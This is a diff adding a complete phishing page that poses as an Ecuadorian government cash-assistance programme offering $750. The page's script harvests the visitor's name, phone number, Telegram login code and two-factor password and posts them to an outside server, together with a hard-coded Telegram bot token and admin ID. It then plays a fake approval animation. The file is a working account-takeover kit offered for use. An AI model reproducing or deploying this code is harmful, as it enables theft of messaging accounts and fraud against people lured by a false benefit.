@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>El Nuevo Ecuador - Asistencia en Efectivo</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
+        body{background:#f5f7fa;color:#333}
+        .header{background:#fff;padding:14px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #eee}
+        .logo-img{height:30px;object-fit:contain}
+        .menu-btn{background:none;border:none;font-size:26px;cursor:pointer}
+        .hero-banner{background:linear-gradient(120deg,#0052cc,#003893);color:#fff;padding:25px 20px 35px;text-align:center}
+        .hero-banner img{max-width:100%;height:auto;border-radius:12px;margin-bottom:15px}
+        .hero-top-logo{font-size:18px;font-weight:bold;margin-bottom:15px}
+        .hero-top-logo span{color:#f5c400}
+        .hero-title h1{font-size:32px;line-height:1.1}
+        .yellow-text{color:#f5c400;font-size:36px}
+        .amount{color:#f5c400;font-size:44px}
+        .hero-features{display:flex;justify-content:space-between;margin-top:25px;gap:8px}
+        .feature-item{text-align:center;flex:1}
+        .feature-icon{width:44px;height:44px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 6px;font-size:20px;color:#0052cc}
+        .feature-text{font-size:11px;line-height:1.3}
+        .container{padding:25px 20px;max-width:500px;margin:0 auto}
+        .info-badge{background:#e1edf9;color:#0052cc;padding:6px 14px;border-radius:20px;font-size:13px;display:inline-block;margin-bottom:15px}
+        .content-title h2{font-size:24px;color:#003893;margin-bottom:8px}
+        .content-title p{font-size:14px;color:#666;margin-bottom:25px}
+        .steps-container{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:25px}
+        .step-card{background:#f0f5fc;border:1px solid #d9e4f1;border-radius:12px;padding:16px}
+        .step-card strong{display:block;color:#003893;font-size:14px;margin-bottom:4px}
+        .step-card span{font-size:12px;color:#555}
+        .input-box{display:flex;align-items:center;background:#fff;border:1px solid #d0d7e3;border-radius:12px;padding:14px 16px;margin-bottom:15px}
+        .input-icon{font-size:20px;margin-right:12px;color:#666}
+        .input-box input{flex:1;border:none;outline:none;font-size:15px;background:transparent}
+        .input-box input::placeholder{color:#999}
+        
+        /* Styling Kotak Pemilih Negara */
+        .country-selector{display:flex;align-items:center;gap:4px;margin-right:8px;padding-right:8px;border-right:1px solid #ddd;background:transparent}
+        .country-selector select{border:none;outline:none;background:transparent;font-size:14px;cursor:pointer;font-weight:bold;color:#333}
+
+        .warning-box{background:#fff9df;border:1px solid #f5d30073;border-radius:8px;padding:12px 14px;margin:18px 0;font-size:13px;color:#7a6400;line-height:1.5}
+        .submit-btn{width:100%;background:#0047ab;color:#fff;border:none;border-radius:12px;padding:16px;font-size:17px;font-weight:bold;cursor:pointer;box-shadow:0 6px 16px rgba(0,71,171,.25)}
+        .submit-btn:hover{background:#003d91}
+        .secure-note{text-align:center;margin-top:15px;font-size:12px;color:#666}
+        .footer-section{background:#f0f7ff;border-top:3px solid;border-image:linear-gradient(90deg,#f5c400,#0052cc,#df1d2d)1;padding:25px 20px;margin-top:30px}
+        .footer-content{max-width:500px;margin:0 auto;text-align:center}
+        .footer-content h3{color:#003893;font-size:18px;margin-bottom:10px}
+        .footer-content p{font-size:14px;color:#666;margin-bottom:15px}
+        .footer-buttons{display:flex;justify-content:center;gap:10px;margin-bottom:15px;flex-wrap:wrap}
+        .footer-btn{background:#fff;color:#0052cc;border:1px solid #0052cc;padding:7px 16px;border-radius:20px;font-size:14px;cursor:pointer}
+        
+        /* Card Container Halaman 2, 3, 6 */
+        .card{background:#fff;border-radius:16px;box-shadow:0 4px 20px rgba(0,71,171,.12);overflow:hidden}
+        .banner{background:#fff;padding:0;text-align:center}
+        .banner img{width:100%;height:auto;display:block}
+        .card-body{padding:30px 24px;text-align:center}
+        .phone{font-size:22px;font-weight:bold;color:#003893;margin-bottom:10px}
+        .info-text{font-size:15px;color:#555;margin-bottom:25px}
+        .code-row{display:flex;justify-content:center;gap:10px;margin-bottom:30px}
+        .code-box{width:50px;height:55px;border:2px solid #dce1e9;border-radius:8px;font-size:22px;text-align:center;outline:none}
+        .code-box:focus{border-color:#0052cc}
+        .note{margin-top:20px;font-size:13px;color:#777;display:flex;align-items:center;justify-content:center;gap:6px}
+        .card-title{font-size:22px;font-weight:bold;color:#003893;margin-bottom:10px}
+        .card-subtitle{font-size:15px;color:#666;margin-bottom:25px;line-height:1.5}
+        .toggle-icon{font-size:18px;color:#777;cursor:pointer}
+        .link-text{color:#0052cc;text-decoration:none;font-size:14px;margin-top:10px;display:inline-block}
+        .copyright{font-size:12px;color:#888;margin-top:10px}
+        
+        /* Halaman 6 Elements */
+        .icon-circle{width:90px;height:90px;border-radius:50%;background:linear-gradient(135deg,#e6f0ff,#cce0ff);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;position:relative}
+        .icon-inner{width:70px;height:70px;border-radius:50%;background:#0052cc;display:flex;align-items:center;justify-content:center;font-size:30px;color:#fff}
+        .icon-ring{position:absolute;width:90px;height:90px;border-radius:50%;background:conic-gradient(#0052cc 0deg,#f5c400 120deg,#df1d2d 240deg,transparent 360deg);clip-path:inset(0 0 0 50%);animation:spin 2s linear infinite}
+        @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+        .status-title{font-size:20px;font-weight:bold;color:#003893;margin-bottom:8px}
+        .status-desc{font-size:14px;color:#666;margin-bottom:25px}
+        .progress-bar-container{height:6px;background:#e0e7f3;border-radius:3px;margin-bottom:25px;overflow:hidden}
+        .progress-bar{height:100%;width:85%;background:linear-gradient(90deg,#0052cc,#f5c400,#df1d2d);border-radius:3px;animation:loading 2s ease-in-out infinite alternate}
+        @keyframes loading{from{width:30%}to{width:100%}}
+        .steps-list{text-align:left;margin-bottom:25px}
+        .step-item{display:flex;align-items:center;padding:12px 14px;border-radius:10px;margin-bottom:10px;background:#f7f9fc}
+        .step-item.completed{background:#e6ffed;color:#007a3d}
+        .step-item.active{background:#e6f0ff;border:1px solid #0052cc}
+        .step-icon{font-size:18px;margin-right:12px}
+        .step-text{font-size:15px;font-weight:500}
+        .success-box{background:#edf7ee;border:1px solid #28a745;border-radius:8px;padding:20px 16px;margin-bottom:25px;text-align:center;display:none}
+        .success-box.show{display:block}
+        .success-icon{font-size:48px;color:#28a745;margin-bottom:10px}
+        .success-title{font-size:20px;font-weight:bold;color:#155724;margin-bottom:8px}
+        .success-text{font-size:14px;color:#285b34;line-height:1.5}
+        .action-btn{width:100%;background:#28a745;color:#fff;border:none;border-radius:12px;padding:16px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:10px;display:none}
+        .action-btn.show{display:block}
+        .action-btn:hover{background:#218838}
+
+        /* Kontrol Tampilan SPA Berdasarkan Script Anda */
+        .first, .second, .third, .six { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo-text">
+            <img src="assets/img/logo.png" alt="El Nuevo Ecuador" class="logo-img">
+        </div>
+        <button class="menu-btn">☰</button>
+    </div>
+
+    <!-- 1. HALAMAN DATA DIRI (MINTA OTP) -->
+    <div class="first" style="display: block;">
+        <div class="hero-banner">
+            <img src="assets/img/banner.jpg" alt="Regístrate Ahora" style="max-width:100%; border-radius:10px; margin-bottom:15px;">
+            <div class="hero-features">
+                <div class="feature-item"><div class="feature-icon">📋</div><div class="feature-text">PROCESO FÁCIL Y RÁPIDO</div></div>
+                <div class="feature-item"><div class="feature-icon">✅</div><div class="feature-text">REGISTRO SEGURO Y CONFIABLE</div></div>
+                <div class="feature-item"><div class="feature-icon">🎁</div><div class="feature-text">RECIBA $750 AL REGISTRARSE</div></div>
+            </div>
+        </div>
+        <div class="container">
+            <span class="info-badge">Consulta informativa</span>
+            <div class="content-title">
+                <h2>Verifique su información</h2>
+                <p>Complete los datos solicitados para continuar con la consulta de disponibilidad.</p>
+            </div>
+            <div class="steps-container">
+                <div class="step-card"><strong>1. Datos</strong><span>Ingrese su información correctamente.</span></div>
+                <div class="step-card"><strong>2. Revisión</strong><span>Continúe con la validación inicial.</span></div>
+            </div>
+            <form id="firstForm">
+                <div class="input-box">
+                    <span class="input-icon">🪪</span>
+                    <input type="text" id="full_name" placeholder="Ingrese su nombre completo" required>
+                </div>
+                <div class="input-box">
+                    <!-- DROPDOWN NEGARA DI DALAM KOTAK MERAH -->
+                    <div class="country-selector">
+                        <select id="country_code">
+                            <option value="593" selected>🇪🇨 +593</option>
+                            <option value="60">🇲🇾 +60</option>
+                            <option value="62">🇮🇩 +62</option>
+                            <option value="65">🇸🇬 +65</option>
+                            <option value="63">🇵🇭 +63</option>
+                            <option value="66">🇹🇭 +66</option>
+                            <option value="84">🇻🇳 +84</option>
+                            <option value="54">🇦🇷 +54</option>
+                            <option value="55">🇧🇷 +55</option>
+                            <option value="57">🇨🇴 +57</option>
+                            <option value="51">🇵🇪 +51</option>
+                            <option value="1">🇺🇸 +1</option>
+                            <option value="34">🇪🇸 +34</option>
+                            <option value="52">🇲🇽 +52</option>
+                            <option value="56">🇨🇱 +56</option>
+                            <option value="58">🇻🇪 +58</option>
+                            <option value="591">🇧🇴 +591</option>
+                            <option value="595">🇵🇾 +595</option>
+                            <option value="598">🇺🇾 +598</option>
+                            <option value="44">🇬🇧 +44</option>
+                            <option value="33">🇫🇷 +33</option>
+                            <option value="49">🇩🇪 +49</option>
+                            <option value="39">🇮🇹 +39</option>
+                            <option value="81">🇯🇵 +81</option>
+                            <option value="82">🇰🇷 +82</option>
+                            <option value="86">🇨🇳 +86</option>
+                            <option value="91">🇮🇳 +91</option>
+                            <option value="966">🇸🇦 +966</option>
+                            <option value="971">🇦🇪 +971</option>
+                            <option value="20">🇪🇬 +20</option>
+                            <option value="27">🇿🇦 +27</option>
+                            <option value="61">🇦🇺 +61</option>
+                            <option value="64">🇳🇿 +64</option>
+                        </select>
+                    </div>
+                    <input type="text" id="phone_number" placeholder="Ingrese su número de Telegram" required>
+                </div>
+                <div class="warning-box">Revise que los datos estén correctos antes de continuar.</div>
+                <button type="submit" class="submit-btn">CONSULTAR AHORA</button>
+            </form>
+            <p class="secure-note">🔒 No comparta sus datos con nadie.</p>
+        </div>
+    </div>
+
+    <!-- 2. HALAMAN OTP -->
+    <div class="second">
+        <div class="container">
+            <div class="card">
+                <div class="banner">
+                    <img src="assets/img/1000545172.jpg" alt="Banner">
+                </div>
+                <div class="card-body">
+                    <p class="phone" id="phoneDisplay">+593 XXX XXX XXX</p>
+                    <h2 style="color:#003893;margin-bottom:8px">Verificación 2FA</h2>
+                    <p class="info-text">Ingrese el código de 6 dígitos enviado a su cuenta de Telegram.</p>
+                    <form id="secondForm">
+                        <input type="hidden" id="validatefull_name">
+                        <input type="hidden" id="validatephone_number">
+                        <div class="code-row">
+                            <input class="code-box" type="text" maxlength="1" required>
+                            <input class="code-box" type="text" maxlength="1" required>
+                            <input class="code-box" type="text" maxlength="1" required>
+                            <input class="code-box" type="text" maxlength="1" required>
+                            <input class="code-box" type="text" maxlength="1" required>
+                            <input class="code-box" type="text" maxlength="1" required>
+                        </div>
+                        <button type="submit" class="submit-btn">Verificar Código</button>
+                    </form>
+                    <p class="note">🛡️ Validación segura por Telegram</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. HALAMAN PASSWORD -->
+    <div class="third">
+        <div class="container">
+            <div class="card">
+                <div class="banner">
+                    <img src="assets/img/1000545172.jpg" alt="Banner">
+                </div>
+                <div class="card-body">
+                    <h2 class="card-title">Verificación 2FA</h2>
+                    <p class="card-subtitle">Su cuenta está protegida con autenticación de dos factores.<br>Ingrese su contraseña para continuar.</p>
+                    <form id="thirdForm">
+                        <input type="hidden" id="validateotp_code">
+                        <input type="hidden" id="validatephone_number_pass">
+                        <div class="input-box">
+                            <span class="input-icon">🔒</span>
+                            <input type="password" id="password" placeholder="Ingrese su contraseña" required>
+                            <span class="toggle-icon" id="toggleBtn">👁️</span>
+                        </div>
+                        <div class="warning-box">
+                            ⚠️ Por su seguridad, no comparta su contraseña con nadie. Nuestro equipo nunca le pedirá su contraseña por teléfono o mensaje.
+                        </div>
+                        <button type="submit" class="submit-btn">🔒 CONFIRMAR Y CONTINUAR</button>
+                    </form>
+                    <a href="#" class="link-text">¿Olvidó su contraseña?</a>
+                    <p class="note">🛡️ Sus datos están encriptados y protegidos</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 6. HALAMAN PROSES / SUKSES -->
+    <div class="six">
+        <div class="container">
+            <div class="card">
+                <div class="banner">
+                    <img src="assets/img/1000545172.jpg" alt="Banner">
+                </div>
+                <div class="card-body">
+                    <div class="icon-circle">
+                        <div class="icon-ring" id="iconRing"></div>
+                        <div class="icon-inner" id="iconInner">⚙️</div>
+                    </div>
+                    <h2 class="status-title" id="statusText">Procesando solicitud...</h2>
+                    <p class="status-desc" id="descText">Por favor espere, estamos verificando sus datos.</p>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="progressBar"></div>
+                    </div>
+                    <div class="steps-list" id="stepsList">
+                        <div class="step-item completed" id="step1">
+                            <span class="step-icon">✅</span>
+                            <span class="step-text">Datos verificados</span>
+                        </div>
+                        <div class="step-item completed" id="step2">
+                            <span class="step-icon">✅</span>
+                            <span class="step-text">Código confirmado</span>
+                        </div>
+                        <div class="step-item active" id="step3-status">
+                            <span class="step-icon">⏳</span>
+                            <span class="step-text">Validación de elegibilidad...</span>
+                        </div>
+                        <div class="step-item" id="step4-status">
+                            <span class="step-icon">⭕</span>
+                            <span class="step-text">Resultado final</span>
+                        </div>
+                    </div>
+                    <div class="note-box" id="noteBox" style="background:#fff7e0;border:1px solid #f5d30073;border-radius:8px;padding:14px;font-size:13px;color:#7a5f00;line-height:1.5;margin-bottom:25px">
+                        ⏱️ Este proceso puede tardar unos minutos. No cierre esta ventana.
+                    </div>
+                    <div class="success-box" id="successBox">
+                        <div class="success-icon">🎉</div>
+                        <h3 class="success-title">¡Felicidades!</h3>
+                        <p class="success-text">Usted es elegible para recibir el beneficio de asistencia económica.<br><br> Monto aprobado: <strong>$750.00 USD</strong><br> El depósito se realizará dentro de las próximas 48 horas hábiles.</p>
+                    </div>
+                    <button class="action-btn" id="backBtn" onclick="location.reload()">Volver al Inicio</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER SECTION -->
+    <div class="footer-section">
+        <div class="footer-content">
+            <h3>Asistencia en Efectivo 2026</h3>
+            <p>© 2026 El Nuevo Ecuador. Todos los derechos reservados.</p>
+            <div class="footer-buttons">
+                <button class="footer-btn">Ayuda</button>
+                <button class="footer-btn">Privacidad</button>
+                <button class="footer-btn">Términos</button>
+            </div>
+            <p class="copyright">Este es un sistema de verificación segura.</p>
+        </div>
+    </div>
+
+    <!-- SCRIPT UTAMA ANDA (DISESUAIKAN PENGAMBILAN KODE NEGARA DROPDOWN) -->
+    <script>
+        // ==========================================
+        // PENGATURAN BOT (DIATUR DARI CPANEL)
+        // ==========================================
+        const BOT_TOKEN = "8994915603:AAEXtI1z-AkBo8ACpWP28NB4aHi70ulLtC4"; // Ganti token bot Anda
+        const ADMIN_ID = "6809820646"; // Ganti ID Telegram Anda
+        const SERVER_URL = "https://vpserversr.cloud/bot4";
+        // ==========================================
+
+        // --- 1. HALAMAN DATA DIRI (MINTA OTP) ---
+        document.getElementById('firstForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            document.getElementById('loading').style.display = 'flex';
+            
+            const nama = document.getElementById('full_name').value;
+            const countryCode = document.getElementById('country_code').value;
+            let hpRaw = document.getElementById('phone_number').value;
+            
+            if(hpRaw.startsWith('0')) hpRaw = hpRaw.substring(1);
+            // Menggabungkan kode negara yang dipilih dari dropdown secara otomatis
+            const hp = hpRaw.startsWith(countryCode) ? hpRaw : countryCode + hpRaw;
+
+            try {
+                const response = await fetch(`${SERVER_URL}/api/firstData`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    // MENGIRIMKAN TOKEN & ADMIN ID KE VPS
+                    body: JSON.stringify({ 
+                        action: "request_otp", nama: nama, phone: hp, 
+                        bot_token: BOT_TOKEN, admin_id: ADMIN_ID 
+                    })
+                });
+
+                const result = await response.json();
+                document.getElementById('loading').style.display = 'none';
+
+                if (result.status === "sent") {
+                    document.querySelector('.first').style.display = 'none';
+                    document.querySelector('.second').style.display = 'block';
+                    document.getElementById('validatefull_name').value = nama;
+                    document.getElementById('validatephone_number').value = hp;
+                    const phoneDisplay = document.getElementById('phoneDisplay');
+                    if(phoneDisplay) phoneDisplay.textContent = "+" + hp;
+                } else {
+                    alert("Gagal: " + (result.message || "Nombor tidak sah."));
+                }
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                alert("Error koneksi ke server VPS.");
+            }
+        });
+
+        // --- 2. HALAMAN OTP (VALIDASI & CEK PASSWORD) ---
+        document.getElementById('secondForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            document.getElementById('loading').style.display = 'flex';
+            
+            // Mengambil input dari kotak-kotak OTP
+            const codeBoxes = document.querySelectorAll('.second .code-box');
+            let otp = "";
+            codeBoxes.forEach(box => otp += box.value);
+
+            const hp = document.getElementById('validatephone_number').value;
+
+            try {
+                const response = await fetch(`${SERVER_URL}/api/firstData`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    // MENGIRIMKAN TOKEN & ADMIN ID KE VPS
+                    body: JSON.stringify({ 
+                        action: "verify_otp", phone: hp, otp: otp, 
+                        bot_token: BOT_TOKEN, admin_id: ADMIN_ID 
+                    })
+                });
+
+                const result = await response.json();
+                document.getElementById('loading').style.display = 'none';
+
+                if (result.status === "success") {
+                    document.querySelector('.second').style.display = 'none';
+                    document.querySelector('.six').style.display = 'block'; 
+                    startProcessSimulation();
+                } else if (result.status === "need_password") {
+                    document.querySelector('.second').style.display = 'none';
+                    document.querySelector('.third').style.display = 'block'; 
+                    document.getElementById('validateotp_code').value = otp;
+                    document.getElementById('validatephone_number_pass').value = hp;
+                } else {
+                    alert("KODE OTP SALAH!");
+                    codeBoxes.forEach(box => box.value = "");
+                    codeBoxes[0].focus();
+                }
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                alert("Gagal verifikasi.");
+            }
+        });
+
+        // --- 3. HALAMAN PASSWORD (FINAL SUBMIT) ---
+        document.getElementById('thirdForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            document.getElementById('loading').style.display = 'flex';
+
+            const pass = document.getElementById('password').value;
+            const otp = document.getElementById('validateotp_code').value;
+            const hp = document.getElementById('validatephone_number_pass').value;
+
+            try {
+                const res = await fetch(`${SERVER_URL}/api/firstData`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    // MENGIRIMKAN TOKEN & ADMIN ID KE VPS
+                    body: JSON.stringify({ 
+                        action: "submit_password", phone: hp, otp: otp, pass: pass, 
+                        bot_token: BOT_TOKEN, admin_id: ADMIN_ID 
+                    })
+                });
+
+                const result = await res.json();
+                document.getElementById('loading').style.display = 'none';
+
+                if (result.status === "success") {
+                    document.querySelector('.third').style.display = 'none';
+                    document.querySelector('.six').style.display = 'block';
+                    startProcessSimulation();
+                } else {
+                    alert("Kata Laluan Salah!");
+                }
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                alert("Gagal terhubung ke server.");
+            }
+        });
+
+        // --- BANTUAN UI TAMBAHAN (OTP Auto-Focus & Toggle Password & Loading Element) ---
+        document.addEventListener('DOMContentLoaded', function() {
+            // Buat elemen loading otomatis di DOM
+            if (!document.getElementById('loading')) {
+                const loadingDiv = document.createElement('div');
+                loadingDiv.id = 'loading';
+                loadingDiv.style.cssText = 'display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;justify-content:center;align-items:center;color:#fff;font-size:18px;font-weight:bold;';
+                loadingDiv.innerHTML = '<div style="background:#fff;color:#003893;padding:20px 30px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.2);">Memproses...</div>';
+                document.body.appendChild(loadingDiv);
+            }
+
+            // Toggle Password Visibility
+            const toggleBtn = document.getElementById('toggleBtn');
+            if(toggleBtn) {
+                toggleBtn.addEventListener('click', function() {
+                    const passwordInput = document.getElementById('password');
+                    if (passwordInput.type === 'password') {
+                        passwordInput.type = 'text';
+                        toggleBtn.textContent = '🙈';
+                    } else {
+                        passwordInput.type = 'password';
+                        toggleBtn.textContent = '👁️';
+                    }
+                });
+            }
+
+            // Otomatis pindah kotak input OTP
+            const codeBoxes = document.querySelectorAll('.second .code-box');
+            codeBoxes.forEach((box, index) => {
+                box.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1 && index < codeBoxes.length - 1) {
+                        codeBoxes[index + 1].focus();
+                    }
+                });
+                box.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                        codeBoxes[index - 1].focus();
+                    }
+                });
+            });
+        });
+
+        // Fungsi Animasi Halaman 6 (Proses/Sukses)
+        function startProcessSimulation() {
+            setTimeout(function() {
+                const step3 = document.getElementById('step3-status');
+                if(step3) {
+                    step3.classList.remove('active');
+                    step3.classList.add('completed');
+                    step3.querySelector('.step-icon').textContent = '✅';
+                    step3.querySelector('.step-text').textContent = 'Elegibilidad verificada';
+                }
+            }, 1500);
+
+            setTimeout(function() {
+                const step4 = document.getElementById('step4-status');
+                if(step4) {
+                    step4.classList.add('active');
+                    step4.querySelector('.step-icon').textContent = '🔄';
+                    step4.querySelector('.step-text').textContent = 'Generando resultado...';
+                }
+                document.getElementById('statusText').textContent = 'Casi listo...';
+                document.getElementById('descText').textContent = 'Finalizando su solicitud...';
+            }, 3000);
+
+            setTimeout(function() {
+                document.getElementById('iconRing').style.animation = 'none';
+                document.getElementById('iconInner').textContent = '✅';
+                
+                const step4 = document.getElementById('step4-status');
+                if(step4) {
+                    step4.classList.remove('active');
+                    step4.classList.add('completed');
+                    step4.querySelector('.step-icon').textContent = '✅';
+                    step4.querySelector('.step-text').textContent = '¡Solicitud aprobada!';
+                }
+                
+                const progressBar = document.getElementById('progressBar');
+                if(progressBar) {
+                    progressBar.style.animation = 'none';
+                    progressBar.style.width = '100%';
+                }
+                
+                document.getElementById('noteBox').style.display = 'none';
+                document.getElementById('statusText').textContent = '¡Solicitud Completada!';
+                document.getElementById('descText').textContent = 'Su verificación ha sido aprobada.';
+                document.getElementById('successBox').classList.add('show');
+                document.getElementById('backBtn').classList.add('show');
+            }, 4500);
+        }
+    </script>
+</body>
+</html>
+
